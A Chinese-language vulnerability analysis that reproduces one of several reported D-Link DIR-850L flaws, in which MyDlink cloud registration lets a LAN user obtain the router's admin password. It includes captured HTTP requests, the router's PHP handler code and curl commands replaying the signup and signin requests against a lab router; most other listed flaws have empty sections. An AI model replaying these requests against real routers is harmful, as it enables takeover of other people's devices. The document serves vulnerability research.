## 0x00背景

2017年9月8号，Pierre Kim在其github博客上公布了D-Link 850L的私有协议MyDlink Cloud protocol存在的安全漏洞和相关技术细节，准确统计有10个漏洞，如下（这部分直接引用网上翻译的数据，比我总结得更全面）：
- **Firmware**: (reserved)
- **xss**: (reserved)
- **Retrieving admin password**: 攻击者可以获取admin的口令，利用MyDlink云协议添加攻击者帐号到路由器，获取路由器的控制权；
- **Weak Cloud protocol**: (reserved)
- **Backdoor access**: (reserved)
- **Stunnel private keys**: (reserved)
- **Nonce bruteforcing for DNS configuration**: (reserved)
- **Weak files permission and credentials stored in cleartext**: (reserved)
- **Pre-Auth RCEs as root (L2)**: (reserved)
- **DoS against some daemons**: (reserved)

**注意**：我分析的硬件版本是A1，固件版本是DIR-850L_REVA_FIRMWARE_1.14.B07_WW，并于2017年12月xx日在![官网下载](http://support.dlink.com/ProductInfo.aspx?m=DIR-850L)（当时官方提供的A1硬件最老的版本），另有两个补丁包，分别用于修复本文描述的漏洞和dns组件的漏洞，作者提及的A1硬件的固件包DIR850L_REVA_FW114WWb07_h2ab_beta1.bin则无法获取到，导致很多现象跟漏洞作者的发现存在出入，请知悉。

## 0x01 漏洞分析

:zero: **Firmware**

:one: **xss**

:two: **Retrieving admin password**

**获取web管理员密码漏洞** 本质缺陷在于Mydlink云协议在路由器端没有对发送请求的用户身份进行鉴权，导致任意用户可以请求路由器将其注册到远程的Mydlink云端，然后用户通过注册时提供的账号和密码，登陆到Mydlink云端的web管理界面，虽然协议采用https，但对通信双方而言数据是透明的，只是对中间人是加密的数据。这部分https数据中就包含明文的路由器的web管理界面密码。简言之，非管理员的局域网用户通过Mydlink云协议能够获取管理员的账号密码。

#### Mydlink UI注册：

![r1](https://wx3.sinaimg.cn/mw1024/a750c5f9gy1fmd0t3juvsj212x0etdgx.jpg)

![r2](https://wx2.sinaimg.cn/mw1024/a750c5f9gy1fmd0t5uxkfj21300gcaaw.jpg)

![r3](https://wx3.sinaimg.cn/mw1024/a750c5f9gy1fmd0t9yf2uj212y0h6wff.jpg)

![r4](https://wx2.sinaimg.cn/mw1024/a750c5f9gy1fmd0tviugmj212b0gugml.jpg)

![r5](https://wx2.sinaimg.cn/mw1024/a750c5f9gy1fmd0tzyvu1j214l0gs7di.jpg)

通过wireshark抓包获取到上述步骤中的管理员进行注册操作的数据流，实际抓到两个包，简单理解为注册包和登陆包，此处与漏洞作者的发现存在出入，作者手动模拟的时候实际发了三个包，除前两个包外，还有一个包是添加设备包。不清楚UI操作时为什么没发送抓个包，而且wiz_mydlink.php页面也不包含act=adddev的脚本代码，可能的两个原因是：
> 1.固件版本存在差异（DIR850L_REVA_FW114WWb07_h2ab_beta1.bin vs DIR-850L_REVA_FIRMWARE_1.14.B07_WW）
> 2.UI操作本身就不发送第三个包，而是路由器自身通过其他方式完成了这步操作 

查看注册包和登陆包：

1. 注册包
```python
-----------------------------------------------------------------------------------------------------------------------
POST /register_send.php HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
Content-Length: 99
Origin: http://192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: http://192.168.0.1/wiz_mydlink.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: uid=9w3HkdQTvu

act=signup&lang=zh_CN&outemail=EMAIL_ADDR&passwd=PASSWD_FOR_LOGIN&firstname=beeman&lastname=the

HTTP/1.1 200 OK
Server: Linux, HTTP/1.1, DIR-850L Ver 1.14WW
Date: Tue, 05 Dec 2017 11:10:47 GMT
Transfer-Encoding: chunked
Content-Type: text/xml

<?xml version="1.0"?>
<register_send>
<result>success</result>
<url>https://mp-cn-portal.auto.mydlink.com</url>
</register_send>
-----------------------------------------------------------------------------------------------------------------------
```

2. 登录包
```python
-----------------------------------------------------------------------------------------------------------------------
POST /register_send.php HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
Content-Length: 85
Origin: http://192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*	
Referer: http://192.168.0.1/wiz_mydlink.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: uid=9w3HkdQTvu

act=signin&lang=zh_CN&outemail=EMAIL_ADDR&passwd=PASSWD_FOR_LOGIN&mydlink_cookie=

HTTP/1.1 200 OK
Server: Linux, HTTP/1.1, DIR-850L Ver 1.14WW
Date: Tue, 05 Dec 2017 11:11:10 GMT
Transfer-Encoding: chunked
Content-Type: text/xml

<?xml version="1.0"?>
<register_send>
<result>success</result>
<url>https://mp-cn-portal.auto.mydlink.com</url>
</register_send>
-----------------------------------------------------------------------------------------------------------------------
```
#### Mydlink 命令行注册：

通过UI操作简单熟悉了Mydlink云协议，现在使用命令行的方式复现这步操作（由于上面的操作已经完成了注册，所以命令行模拟前需登录Mydlink云端将设备和账号注销，该步骤会触发路由器重置操作，等待其完成后再进行模拟，这里不详述直接跳过）。查看register_send.php内容：

首先，进行权限认证:
```php
if ($AUTHORIZED_GROUP < 0)
{       
        echo "Authenication fail";
}
else
{
    //init local parameter
    $fwver = query("/runtime/device/firmwareversion");
    $modelname = query("/runtime/device/modelname");
    $devpasswd = query("/device/account/entry/password");
    $action = $_POST["act"];
    $wizard_version = $modelname. "_". $fwver;
    $result = "success";
```

然后，获取请求动作，提取用户提交的POST数据重组后发往Mydlink云端：
```php
    //sign up
    $post_str_signup = "client=wizard&wizard_version=" .$wizard_version. "&lang=" .$_POST["lang"].
                       "&action=sign-up&accept=accept&email=" .$_POST["outemail"]. "&password=" .$_POST["passwd"].
                       "&password_verify=" .$_POST["passwd"]. "&name_first=" .$_POST["firstname"]. "&name_last=" .$_POST["lastname"]." ";

    $post_url_signup = "/signin/";

    $action_signup = "signup";

    //sign in
    $post_str_signin = "client=wizard&wizard_version=" .$wizard_version. "&lang=" .$_POST["lang"].
                "&email=" .$_POST["outemail"]. "&password=" .$_POST["passwd"]." ";

    $post_url_signin = "/account/?signin";

    $action_signin = "signin";

    //add dev (bind device)
    $post_str_adddev = "client=wizard&wizard_version=" .$wizard_version. "&lang=" .$_POST["lang"].
                "&dlife_no=" .$mydlink_num. "&device_password=" .$devpasswd. "&dfp=" .$dlinkfootprint." ";

    $post_url_adddev = "/account/?add";

    $action_adddev = "adddev";

    //main start
    if($action == $action_signup)
    {
        $post_str = $post_str_signup;
        $post_url = $post_url_signup;
        $withcookie = "";   //signup dont need cookie info
    }
    else if($action == $action_signin)
    {
        $post_str = $post_str_signin;
        $post_url = $post_url_signin;
        $withcookie = "\r\nCookie: lang=en; mydlink=pr2c11jl60i21v9t5go2fvcve2;";
    }
    else if($action == $action_adddev)
    {
        $post_str = $post_str_adddev;
        $post_url = $post_url_adddev;
    }
    else
        $result = "fail";
```
最后，手动模拟发包，注意两点：
>1. 我测试的固件版本对云协议操作存在权限校验，所以需要提供一个合法的cookie。
>2. 由于上面UI操作时发送两个数据包就能完成该工作，所以我也决定只发两个包进行尝试。

第一个请求 (signup)会在MyDlink服务上创建一个用户:

```python
-----------------------------------------------------------------------------------------------------------------------
curl -v  -H 'Cookie:uid=paYh93tqw4' -d 'act=signup&lang=zh_CN&outemail=EMAIL_ADDR&passwd=PASSWD_FOR_LOGIN&firstname=beeman&lastname=the' http://192.168.100.1/register_send.php
*   Trying 192.168.100.1...
* Connected to 192.168.100.1 (192.168.100.1) port 80 (#0)
> POST /register_send.php HTTP/1.1
> Host: 192.168.100.1
> User-Agent: curl/7.47.0
> Accept: */*
> Cookie:uid=paYh93tqw4
> Content-Length: 99
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 99 out of 99 bytes
< HTTP/1.1 200 OK
< Server: Linux, HTTP/1.1, DIR-850L Ver 1.14WW
< Date: Mon, 11 Dec 2017 12:10:12 GMT
< Transfer-Encoding: chunked
< Content-Type: text/xml
< 
<?xml version="1.0"?>
<register_send>
	<result>success</result>
	<url>https://mp-cn-portal.auto.mydlink.com</url>
</register_send>
-----------------------------------------------------------------------------------------------------------------------
```

第二个请求 (signin)路由器会将登录Mydlink云端，用于判断注册请求是否申请成功：

```python
-----------------------------------------------------------------------------------------------------------------------
curl -v  -H 'Cookie:uid=paYh93tqw4' -d 'act=signin&lang=zh_CN&outemail=EMAIL_ADDR&passwd=PASSWD_FOR_LOGIN&mydlink_cookie=' http://192.168.100.1/register_send.php
*   Trying 192.168.100.1...
* Connected to 192.168.100.1 (192.168.100.1) port 80 (#0)
> POST /register_send.php HTTP/1.1
> Host: 192.168.100.1
> User-Agent: curl/7.47.0
> Accept: */*
> Cookie:uid=paYh93tqw4
> Content-Length: 85
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 85 out of 85 bytes
< HTTP/1.1 200 OK
< Server: Linux, HTTP/1.1, DIR-850L Ver 1.14WW
< Date: Mon, 11 Dec 2017 12:12:17 GMT
< Transfer-Encoding: chunked
< Content-Type: text/xml
< 
<?xml version="1.0"?>
<register_send>
	<result>success</result>
	<url>https://mp-cn-portal.auto.mydlink.com</url>
</register_send>
-----------------------------------------------------------------------------------------------------------------------
```
按照代码逻辑，应该需要发送第三个包'act=adddev'，这个包会将路由器的web管理密码发送给Mydlink云端，这样攻击者访问云端时才能获取到该路由器的管理密码。但实际测试中我们只需要发送前两个包就能完成注册，也能获取到web管理密码，佐证如下：

![login](http://wx1.sinaimg.cn/mw690/a750c5f9gy1fmd4pzeyl5j216h0mzjzm.jpg)

#### 总结与思考

:question:如何抓取路由器发往Mydlink云端的数据包？

首选当然是登录到路由器上直接抓取WAN口网卡，但测试版本固件未直接启动登录服务，只能通过利用![路由器的其他漏洞](https://github.com/TheBeeMan/DLink-850L-Multiple-Vulnerabilities-Analysis)迫使其开放telnet服务，但此种利用方式并不稳定，我测试时仍然无法登录到目标路由器上。

其次，搭建二建路由环境，在路由器的上级网关处抓包，获取路由器发往Mydlink云端的http/https协议数据，在实际抓包时我设置了dns+http+https的过滤器用于获取三种协议的流量，结果未发现解析Mydlink域名的数据，故我认为流程捕获失败，这部分流程是否以not dns+https的形式存在？

再者，镜像dump，在目标路由器和其上级网关之间复制流量镜像，通过laptap这种小设备就能做到，很可惜同样未捕获到。

最后，这个实验还需要重新操作N次，目的是实现Mydlink协议的流量捕获。

:question:为什么缺少交互缺少'act=adddev'数据包仍然可以获取管理密码？

按照代码逻辑，应该需要发送第三个包'act=adddev'，这个包会将路由器的web管理密码发送给Mydlink云端，这样攻击者访问云端时才能获取到该路由器的管理密码。
实际测试缺少这个数据包仍然利用成功，说明路由器通过其他方式发送出了自己的管理密码到云端，可能是某种隐式的方式。要论证，必须捕获完整的通信流量，又回到上个问题了。

:question:漏洞的本质是什么？

其实，上面两个问题都只是操作层名的问题，跟漏洞本质缺陷无关。按照漏洞作者之意，导致漏洞产生的核心是register_send.php未对请求用户的身份进行鉴权，理应管理员才能请求成功，普通局域网用户请求会失败，如果没有身份校验确实会导致普通用户也能获取管理密码的后果。

只是实际测试中已无法论证作者的观点，存在漏洞的固件版本已经不复存在，我们验证的版本有身份验证，不存在漏洞。

:three: **Weak Cloud protocol**

:four: **Backdoor access**

:five: **Stunnel private keys**

:six: **Nonce bruteforcing for DNS configuration**

:seven: **Weak files permission and credentials stored in cleartext**

:eight: **Pre-Auth RCEs as root (L2)**

:nine: **DoS against some daemons**
